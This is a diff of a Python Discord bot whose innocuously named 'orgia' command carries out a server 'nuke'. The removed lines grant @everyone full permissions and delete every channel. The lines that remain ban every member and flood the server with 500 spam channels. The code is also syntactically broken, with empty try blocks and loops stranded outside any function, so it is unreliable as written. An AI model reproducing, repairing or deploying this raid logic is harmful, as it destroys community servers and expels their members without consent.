@@ -34,26 +34,13 @@ async def overheat(ctx):
   
 @client.command()
 async def orgia(ctx):
-  await ctx.message.delete()
-  guild = ctx.guild
-  await nuke(guild)
-  
-
-  
-@client.event
-async def nuke(guild):  
-  role = discord.utils.get(guild.roles, name = "@everyone")
-  try:
-    await role.edit(permissions = discord.Permissions.all())
-  for channel in guild.channels:
-    try:
-      await channel.delete()
   for member in guild.members:
     try:
       await member.ban()
     except: 
   for i in range(500):
     await guild.create_text_channel('TAKE UR HEART')
+  
  
     
 client.run(os.environ['token'])
